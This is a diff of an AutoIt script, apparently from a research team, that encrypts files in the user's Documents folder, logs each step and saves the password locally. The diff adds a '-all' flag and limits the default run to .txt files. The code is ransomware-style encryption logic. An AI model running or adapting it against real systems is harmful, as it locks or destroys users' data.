@@ -1,14 +1,3 @@
-#cs ----------------------------------------------------------------------------
-
- AutoIt Version: 3.3.16.1
- Author:         BypassIT Research Team
-
- Script Function:
-    Encrypts all files in the current user's Documents directory, regardless of file type,
-    writes password to terminal and file, and logs operations with timestamps.
-
-#ce ----------------------------------------------------------------------------
-
 #include <Crypt.au3>
 #include <File.au3>
 #include <Array.au3>
@@ -21,6 +10,15 @@
 Local $folderPath = @MyDocumentsDir
 Local $passwordFilePath = @ScriptDir & "\\encryption_password.txt"
 Local $logFilePath = @ScriptDir & "\\encryption_log.txt"
+Local $encryptAllFiles = False
+
+; Check for -all flag
+For $i = 1 To $CmdLine[0]
+    If $CmdLine[$i] = "-all" Then
+        $encryptAllFiles = True
+        ExitLoop
+    EndIf
+Next
 
 ; Function to log messages
 Func LogMessage($message)
@@ -66,6 +64,12 @@ Func EncryptFiles($directory)
             ContinueLoop
         EndIf
 
+        ; Check if the file should be encrypted
+        If Not $encryptAllFiles And StringRight($file, 4) <> ".txt" Then
+            LogMessage("Skipped non-txt file: " & $filePath)
+            ContinueLoop
+        EndIf
+
         LogMessage("Attempting to encrypt: " & $filePath)
 
         Local $fileContent = FileRead($filePath)
@@ -100,7 +104,7 @@ Func EncryptFiles($directory)
     Return $encryptedCount
 EndFunc
 
-; Encrypt all files in the current user's Documents directory
+; Encrypt files in the current user's Documents directory
 Local $encryptedCount = EncryptFiles($folderPath)
 
 ; Save password to file
